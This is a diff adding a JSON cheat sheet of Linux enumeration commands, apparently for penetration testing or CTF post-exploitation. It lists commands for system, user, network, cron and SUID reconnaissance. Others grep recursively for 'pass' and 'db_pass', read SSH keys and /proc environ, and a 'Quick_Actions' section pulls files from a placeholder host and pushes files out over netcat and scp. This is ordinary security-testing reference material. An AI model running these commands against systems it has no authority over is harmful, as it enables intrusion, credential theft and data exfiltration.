@@ -1,0 +1,78 @@
+{
+    "System": {
+        "Architecture": "uname -m",
+        "Kernel Release": "uname -r",
+        "OS Release": "cat /etc/os-release",
+        "Hostname": "hostname"
+    },
+    "Users_Groups": {
+        "Current User": "whoami",
+        "Current User IDs": "id",
+        "List Users": "cat /etc/passwd",
+        "List Groups": "cat /etc/group",
+        "Logged-In Users": "w"
+    },
+    "Sudo": {
+        "Check Sudo Version": "sudo -V",
+        "List Sudo Privileges": "sudo -l"
+    },
+    "Processes_Services": {
+        "List Processes": "ps aux",
+        "List Services (systemd)": "systemctl list-units --type=service",
+        "List Services (init.d)": "ls -l /etc/init.d/"
+    },
+    "Network": {
+        "Interfaces": "ip a",
+        "Routing Table": "ip route",
+        "Listening Ports": "netstat -tulpn",
+        "ARP Table": "arp -n"
+    },
+    "Scheduled_Tasks": {
+        "User Cron": "crontab -l",
+        "System Cron": "cat /etc/crontab",
+        "Cron Directories": "ls -l /etc/cron.*"
+    },
+    "Sensitive Files":{
+        "Substring: pass":"grep -orP '.{0,30}pass.{0,30}'",
+        "Substring: user":"grep -orP '.{0,30}user.{0,30}'",
+        "Substring: db_user":"grep -orP '.{0,30}db_user.{0,30}'",
+        "Substring: db_pass":"grep -orP '.{0,30}db_pass.{0,30}'"
+    },
+    "Files_Dirs": {
+        "Home Directory": "ls -la ~",
+        "World Writable Dirs": "find / -type d -perm -0002 2>/dev/null",
+        "SUID Files": "find / -perm -4000 -type f 2>/dev/null",
+        "SGID Files": "find / -perm -2000 -type f 2>/dev/null"
+    },
+    "Packages": {
+        "Installed Packages (Debian)": "dpkg -l",
+        "Installed Packages (RHEL)": "rpm -qa"
+    },
+    "Logs": {
+        "Auth Log": "cat /var/log/auth.log",
+        "Syslog": "cat /var/log/syslog",
+        "Messages": "cat /var/log/messages"
+    },
+    "Storage": {
+        "Disk Usage": "df -h",
+        "Mounts": "mount"
+    },
+    "SSH": {
+        "Authorized Keys": "cat ~/.ssh/authorized_keys",
+        "Known Hosts": "cat ~/.ssh/known_hosts",
+        "SSH Config": "cat /etc/ssh/sshd_config"
+    },
+    "Quick_Actions": {
+        "Ping Sweep (Class C)": "for i in $(seq 1 254); do ping -c 1 <net_prefix>.$i | grep 'bytes from'; done",
+        "Dump /proc/cmdline": "cat /proc/cmdline",
+        "Dump /proc/<pid>/cmdline": "tr '\\0' ' ' < /proc/<pid>/cmdline",
+        "Dump /proc/<pid>/environ": "tr '\\0' '\\n' < /proc/<pid>/environ",
+        "Dump All /proc/*/cmdline": "for p in /proc/[0-9]*/cmdline; do echo \"$p:\"; tr '\\0' ' ' < \"$p\" 2>/dev/null; echo; done",
+        "List Environment Vars": "printenv",
+        "Download File (wget)": "wget http://<host>/<file>",
+        "Download File (curl)": "curl -O http://<host>/<file>",
+        "Upload File (nc - receiving end)": "nc -lvp <port> > <outfile>",
+        "Upload File (nc - sending end)": "nc <host> <port> < <file>",
+        "Upload File (scp)": "scp <file> user@<host>:<dest>"
+    }
+}
